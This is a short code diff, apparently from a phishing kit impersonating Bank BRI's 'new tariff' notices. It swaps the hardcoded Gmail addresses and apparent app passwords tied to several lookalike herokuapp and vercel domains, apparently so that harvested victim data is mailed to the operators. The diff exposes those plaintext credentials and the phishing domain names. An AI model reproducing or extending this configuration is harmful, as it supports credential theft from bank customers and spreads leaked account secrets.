@@ -7,22 +7,10 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
   
- if (url == 'info-pilihan-tarif-baru-bri.herokuapp.com'){
+       if (url == 'pilihan-tarif-baru-bri.vercel.com'){
 
-       email = 'ngetes243@gmail.com'
-       pass = 'fcszbgyhpvmrdqtq'
-    }else
-    
-     if (url == 'pilihan-tarif-terbaru-brii.herokuapp.com'){
-
-       email = 'jakad2748@gmail.com'
-       pass = 'eyyedapdhbywvm'
-    }else
-    
-   if (url == 'pilihan-tarif-bank-bri.herokuapp.com'){
-
-       email = 'linkgoggle500@gmail.com'
-       pass = 'rcvvtbhldziblmgq'
+       email = 'harapankuh82@gmail.com'
+       pass = 'ubdoxkcsdghphmjo'
     }else
     
     if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
